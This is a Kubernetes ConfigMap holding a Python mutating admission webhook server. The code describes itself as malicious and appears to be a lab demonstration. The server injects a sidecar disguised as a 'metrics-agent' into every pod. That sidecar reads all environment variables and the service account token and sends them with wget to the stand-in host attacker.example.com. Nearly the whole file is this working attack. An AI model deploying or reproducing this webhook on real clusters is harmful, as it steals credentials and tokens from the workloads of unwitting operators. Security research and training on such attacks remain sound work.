---
# ConfigMap containing the Python webhook server.
# The server receives AdmissionReview requests and injects a "spy" sidecar
# into every pod created outside of the webhook-system and kube-system namespaces.
apiVersion: v1
kind: ConfigMap
metadata:
  name: webhook-server-code
  namespace: webhook-system
data:
  webhook-server.py: |
    #!/usr/bin/env python3
    """
    Malicious Mutating Admission Webhook Server

    Intercepts pod creation requests and injects a sidecar container
    that exfiltrates environment variables (credentials, API keys, tokens)
    to an attacker-controlled endpoint.
    """
    import json
    import base64
    import ssl
    import os
    import sys
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from socketserver import ThreadingMixIn

    # In a real attack this would be an external C2 server.
    EXFIL_ENDPOINT = "http://attacker.example.com/collect"

    INJECTED_SIDECAR = {
        "name": "metrics-agent",  # Disguised as a legitimate metrics sidecar
        "image": "busybox:1.36",
        "command": ["sh", "-c"],
        "args": [
            # Collect all environment variables (which may contain secrets/tokens)
            # and send them to the attacker-controlled endpoint.
            """
            ENV_DATA=$(env | base64 | tr -d '\\n')
            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | base64 | tr -d '\\n')
            NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
            POD_NAME=$HOSTNAME
            wget -q -O /dev/null --post-data \
              "pod=$POD_NAME&ns=$NAMESPACE&env=$ENV_DATA&token=$TOKEN" \
              'http://attacker.example.com/collect' 2>/dev/null || true
            echo "[metrics-agent] Initialization complete."
            # Keep running to appear legitimate
            while true; do sleep 3600; done
            """
        ],
        "resources": {
            "requests": {"cpu": "1m", "memory": "8Mi"},
            "limits":   {"cpu": "10m", "memory": "16Mi"},
        },
    }

    def build_patch(add_sidecar=True):
        """Build a JSON Patch that appends the sidecar to spec.containers."""
        if not add_sidecar:
            return []
        return [
            {
                "op": "add",
                "path": "/spec/containers/-",
                "value": INJECTED_SIDECAR,
            }
        ]

    def admission_response(uid, patch_ops):
        patch_b64 = base64.b64encode(
            json.dumps(patch_ops).encode()
        ).decode() if patch_ops else ""
        resp = {
            "apiVersion": "admission.k8s.io/v1",
            "kind": "AdmissionReview",
            "response": {
                "uid": uid,
                "allowed": True,
            },
        }
        if patch_b64:
            resp["response"]["patchType"] = "JSONPatch"
            resp["response"]["patch"] = patch_b64
        return resp

    class WebhookHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            print(f"[webhook] {self.address_string()} - {fmt % args}", flush=True)

        def do_POST(self):
            # The API server appends ?timeout=Xs to the path, so check with startswith
            if not self.path.startswith("/mutate"):
                self.send_response(404)
                self.end_headers()
                return

            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)

            try:
                review = json.loads(body)
            except Exception as e:
                print(f"[webhook] ERROR parsing body: {e}", flush=True)
                self.send_response(400)
                self.end_headers()
                return

            uid = review["request"]["uid"]
            namespace = review["request"].get("namespace", "")
            name = review["request"]["object"]["metadata"].get("name", "<unnamed>")

            print(f"[webhook] Intercepted pod creation: {namespace}/{name}", flush=True)

            # Inject into every pod (in a real attack, filter by namespace/label)
            patch = build_patch(add_sidecar=True)
            response = admission_response(uid, patch)

            resp_bytes = json.dumps(response).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(resp_bytes)))
            self.end_headers()
            self.wfile.write(resp_bytes)
            self.wfile.flush()

    class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
        """Handle requests in a separate thread for each connection."""
        daemon_threads = True

    def main():
        cert = os.environ.get("TLS_CERT", "/certs/tls.crt")
        key  = os.environ.get("TLS_KEY",  "/certs/tls.key")
        port = int(os.environ.get("PORT", 8443))

        server = ThreadedHTTPServer(("0.0.0.0", port), WebhookHandler)

        # Use create_default_context for proper TLS server configuration
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(cert, key)
        # Allow connections without client cert (API server uses its own CA for the webhook)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        server.socket = ctx.wrap_socket(server.socket, server_side=True)

        print(f"[webhook] Listening on :{port} (TLS)", flush=True)
        sys.stdout.flush()
        server.serve_forever()

    if __name__ == "__main__":
        main()
